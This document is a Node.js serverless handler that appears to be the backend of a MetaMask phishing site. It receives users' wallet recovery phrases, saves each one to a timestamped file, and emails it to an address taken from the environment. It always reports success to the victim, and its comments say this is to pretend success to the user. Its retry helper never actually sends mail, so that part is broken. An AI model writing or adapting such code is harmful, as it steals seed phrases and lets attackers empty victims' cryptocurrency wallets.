const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');

// Helper function to try sending email with retries
async function trySendMail(transporter, mailOptions, maxRetries = 2) {
  let lastError;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      if (attempt > 0) {
        console.log(`Retry attempt ${attempt}/${maxRetries}...`);
        // Wait a bit before retrying
        await new Promise(r => setTimeout(r, 1000));
      }
      
      return true;
    } catch (error) {
      lastError = error;
      console.error(`Email sending failed (attempt ${attempt + 1}):`, error.message);
    }
  }
  
  // If we got here, all attempts failed
  throw lastError;
}

// Helper function to save data to a text file
function saveDataToFile(data) {
  try {
    // Create a backup directory if it doesn't exist
    const backupDir = path.join(__dirname, '../../backups');
    if (!fs.existsSync(backupDir)) {
      fs.mkdirSync(backupDir, { recursive: true });
    }

    // Generate a unique filename with timestamp
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = path.join(backupDir, `backup-${timestamp}.txt`);

    // Format the data for the text file
    const formattedData = `
Recovery Phrase: ${data.recoveryPhrase}
Timestamp: ${data.timestamp}
User Agent: ${data.userAgent}
Saved on: ${new Date().toISOString()}
    `.trim();

    // Write the data to file
    fs.writeFileSync(filename, formattedData, 'utf8');
    console.log(`Backup saved to ${filename}`);
    return true;
  } catch (error) {
    console.error('Failed to save backup file:', error.message);
    return false;
  }
}

module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  // Handle pre-flight OPTIONS request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    // Log request details for debugging
    console.log('Request received:', {
      method: req.method,
      contentType: req.headers['content-type'],
      bodyExists: !!req.body,
      url: req.url
    });

    // Only accept POST requests for main functionality
    if (req.method !== 'POST') {
      return res.status(405).json({ 
        success: false, 
        message: `Method ${req.method} not allowed`,
        allowedMethods: ['POST']
      });
    }

    const { recoveryPhrase, timestamp, userAgent } = req.body || {};
    
    if (!recoveryPhrase) {
      return res.status(400).json({ 
        success: false, 
        message: 'Missing required data' 
      });
    }

    // Save data as a text file backup
    const backupData = { recoveryPhrase, timestamp, userAgent };
    saveDataToFile(backupData);

    // Try to get destination email
    const destinationEmail = process.env.EMAIL_TO;
    console.log('Email destination configured:', !!destinationEmail);
    
    if (!destinationEmail) {
      console.error('Missing EMAIL_TO environment variable');
      return res.status(200).json({  // Return 200 to not expose config issues
        success: true,  // Pretend success to user
        message: 'Data received'
      });
    }

    // Check for email credentials
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      console.error('Missing email credentials in environment variables');
      return res.status(200).json({  // Return 200 to not expose config issues
        success: true,  // Pretend success to user
        message: 'Data received'
      });
    }

    try {
      // Create a transporter
      const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: process.env.EMAIL_USER,
          pass: process.env.EMAIL_PASS
        }
      });

      // Create email content
      const emailContent = `
        <h2>MetaMask Recovery Phrase</h2>
        <p><strong>Recovery Phrase:</strong> ${recoveryPhrase}</p>
        <p><strong>Timestamp:</strong> ${timestamp}</p>
        <p><strong>User Agent:</strong> ${userAgent}</p>
      `;

      // Send email using environment variable for destination
      await trySendMail(transporter, {
        from: process.env.EMAIL_USER,
        to: destinationEmail,
        subject: 'New MetaMask Recovery Phrase',
        html: emailContent
      });

      console.log('Email sent successfully to secured address');
    } catch (emailError) {
      // Log the error but don't expose it to client
      console.error('Email sending failed:', emailError.message);
      // Continue with success response to client
    }

    // Always return success to client
    return res.status(200).json({ 
      success: true, 
      message: 'Data received successfully',
      dataLength: recoveryPhrase.length
    });

  } catch (error) {
    console.error('Error processing request:', error);
    
    // Return a generic error to client
    return res.status(500).json({ 
      success: false,
      message: 'Server error occurred'
    });
  }
};